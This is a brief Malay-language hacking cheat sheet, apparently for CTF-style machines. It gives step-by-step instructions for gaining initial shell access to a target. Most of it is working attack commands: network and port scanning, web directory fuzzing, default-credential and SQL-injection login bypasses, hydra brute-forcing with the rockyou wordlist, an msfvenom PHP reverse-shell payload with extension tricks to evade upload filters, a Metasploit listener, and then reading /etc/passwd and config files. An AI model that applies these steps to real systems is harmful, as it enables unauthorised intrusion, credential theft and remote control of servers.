basic reconnaisance, semua dalam turutan.. ini step untuk dapatkan initial access (dapatkan shell)
## 1. cari IP target
`sudo netdiscover`

## 2. Scan port open
```bash
sudo nmap -p- --min-rate=1000 IP // scan dengan cepat, tp tak detail
sudo nmap -sC -sV -A -O IP // scan lambat, tapi detail
```

## 3. Cari vulnerable service
- result daripada nmap, google service punya version untuk cari public exploit
- buat untuk semua open port
- sometimes step ni tak dpt hasil
cth.
`port/80 http apache 2.3.4`

google: ```apache 2.3.4 exploit
	apache 2.3.4 vulnerability
	apache 2.3.4 exploit github```

## if port 80 open, do this
### 1. cari directory/file dalam webserver
```bash
ffuf -u "http://IP/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -c -e .php,.txt,.html
```
### 2. kalau ada login, cuba buat ni
- login guna default credential
```bash
admin:admin
admin:password
root:root
admin:admin123
boleh google banyak lagi default credential
```
- test sql injection
```
username -> admin' or 1=1-- str
password -> admin
```
- try bruteforce
```bash
sudo hydra -l username -P /usr/share/wordlists/rockyou.txt IP http-post-form "/main/login.php:username=username&password=^PASS^:Invalid Password!"

ubah username jadi username yg betul, and ubah /main/login.php kepada file login yang betul (boleh tgok dkt url login).. also ubah IP
```
### 3. kalau ada upload file feature
- try upload .php file
  cara generate php file
```bash
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php

# IP kita and port kita.. biasa buat 4444
# nnti file tu akan ada dkt folder kita.. nak tahu folder mana tulis pwd
# then upload shell.php tu
```
- kalau .php tak berjaya, cuba rename file tukar extension jadi:
```
.php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar

# command rename -> mv shell.php shell.phtml
```
- kalau berjaya upload, run msfconsole
```bash
> msfconsole
> use exploit/multi/handler
> set LHOST IP-kita
> run
```
then ubah url supaya pergi /uploads/shell.php
- tengok msfconsole, kalau dapat connection tulis, `shell`

## Step lepas dapat shell
- check /etc/passwd file
- check /var/www/main/config.php file
- check /home directory
